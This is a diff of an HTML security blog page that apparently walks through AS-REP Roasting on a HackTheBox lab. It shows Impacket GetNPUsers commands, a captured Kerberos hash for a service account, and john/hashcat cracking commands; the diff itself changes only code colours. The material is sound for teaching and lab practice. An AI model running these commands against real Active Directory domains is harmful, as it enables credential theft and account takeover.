@@ -30,45 +30,45 @@
         <h2 id="as-rep-roasting">AS-REP Roasting</h2>
 <p>Two key attacks on <a href="/posts/kerberos/">Kerberos</a> security in Active Directory include <a href="/posts/kerberoasting/">kerberoasting</a> and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.</p>
 <p>Use the <a href="/posts/impacket/">Impacket</a> tool <code>GetNPUsers.py</code> to try to get a hash for each user</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">λ ~/ctf/htb/forest/ <span style="color:#007020;font-weight:bold">for</span> user in <span style="color:#007020;font-weight:bold">$(</span>cat usernames.txt<span style="color:#007020;font-weight:bold">)</span>; <span style="color:#007020;font-weight:bold">do</span> GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/<span style="color:#70a0d0;font-style:italic">${</span><span style="color:#bb60d5">user</span><span style="color:#70a0d0;font-style:italic">}</span> | grep -v Impacket; <span style="color:#007020;font-weight:bold">done</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">λ ~/ctf/htb/forest/ <span style="color:#66d9ef">for</span> user in <span style="color:#66d9ef">$(</span>cat usernames.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/<span style="color:#e6db74">${</span>user<span style="color:#e6db74">}</span> | grep -v Impacket; <span style="color:#66d9ef">done</span>
 
-<span style="color:#666">[</span>*<span style="color:#666">]</span> Getting TGT <span style="color:#007020;font-weight:bold">for</span> sebastien
-<span style="color:#666">[</span>-<span style="color:#666">]</span> User sebastien doesn<span style="color:#4070a0">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span><span style="color:#4070a0">
-</span><span style="color:#4070a0">[*] Getting TGT for lucinda
-</span><span style="color:#4070a0">[-] User lucinda doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span style="color:#007020">set</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> sebastien
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User sebastien doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[*] Getting TGT for lucinda
+</span><span style="color:#e6db74">[-] User lucinda doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
 
-<span style="color:#666">[</span>*<span style="color:#666">]</span> Getting TGT <span style="color:#007020;font-weight:bold">for</span> svc-alfresco
-<span style="color:#bb60d5">$krb5asrep$23$svc</span>-alfresco@HTB:25311259ddd6d0e65a4ae2cd898c547b<span style="color:#bb60d5">$2328</span>b382956004167ef612abbfd0b3350d362f386d70deadf093d73dd33fadea8bf648d3d7c1cab3565b508a9dafb06cb399ac26e04521ffa22edc882213994257e53976a81b78aaf49dfe02da14f6f76fc7def2a7d4e7e8ff696efa29a1ac4a8df2c0f7856df3c7aa7bbff60e93c1e1fbfc538745a0ffefa3f383d68ddfb4984d1194bc56cc9d168b69a512901815da53cba71a2d0a13c6369fd1b74b9ce3367119502354b2cae4ae3096e5ba4a041fa8a0d1d7f4a92c0f47d2c6ee7bcc73b7f2c3b10955799c807bf43d3035488fb385c68568e770d87d771343e16266ea8f
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB:25311259ddd6d0e65a4ae2cd898c547b$2328b382956004167ef612abbfd0b3350d362f386d70deadf093d73dd33fadea8bf648d3d7c1cab3565b508a9dafb06cb399ac26e04521ffa22edc882213994257e53976a81b78aaf49dfe02da14f6f76fc7def2a7d4e7e8ff696efa29a1ac4a8df2c0f7856df3c7aa7bbff60e93c1e1fbfc538745a0ffefa3f383d68ddfb4984d1194bc56cc9d168b69a512901815da53cba71a2d0a13c6369fd1b74b9ce3367119502354b2cae4ae3096e5ba4a041fa8a0d1d7f4a92c0f47d2c6ee7bcc73b7f2c3b10955799c807bf43d3035488fb385c68568e770d87d771343e16266ea8f
 
-<span style="color:#666">[</span>*<span style="color:#666">]</span> Getting TGT <span style="color:#007020;font-weight:bold">for</span> andy
-<span style="color:#666">[</span>-<span style="color:#666">]</span> User andy doesn<span style="color:#4070a0">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span><span style="color:#4070a0">
-</span><span style="color:#4070a0">[*] Getting TGT for mark
-</span><span style="color:#4070a0">[-] User mark doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span style="color:#007020">set</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> andy
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User andy doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[*] Getting TGT for mark
+</span><span style="color:#e6db74">[-] User mark doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
 
-<span style="color:#666">[</span>*<span style="color:#666">]</span> Getting TGT <span style="color:#007020;font-weight:bold">for</span> santi
-<span style="color:#666">[</span>-<span style="color:#666">]</span> User santi doesn<span style="">&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span style="color:#007020">set</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> santi
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User santi doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
 </code></pre></div><h3 id="list-of-users">List of users</h3>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">impacket-GetNPUsers -dc-ip &lt;target-ip&gt; example.local/ -no-pass -usersfile users.txt
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">impacket-GetNPUsers -dc-ip &lt;target-ip&gt; example.local/ -no-pass -usersfile users.txt
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="crack-hash-or-use-pass-the-hash">Crack hash or use pass-the-hash</h3>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">john --format<span style="color:#666">=</span>krb5asrep --wordlist<span style="color:#666">=</span>wordlist.txt hash.txt
-<span style="color:#60a0b0;font-style:italic"># or</span>
-hashcat -m <span style="color:#40a070">18200</span> -a <span style="color:#40a070">0</span>  hash.txt wordlist.txt
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">john --format<span style="color:#f92672">=</span>krb5asrep --wordlist<span style="color:#f92672">=</span>wordlist.txt hash.txt
+<span style="color:#75715e"># or</span>
+hashcat -m <span style="color:#ae81ff">18200</span> -a <span style="color:#ae81ff">0</span>  hash.txt wordlist.txt
 </code></pre></td></tr></table>
 </div>
 </div><p>The hash is quickly cracked with <code>hashcat</code>.</p>
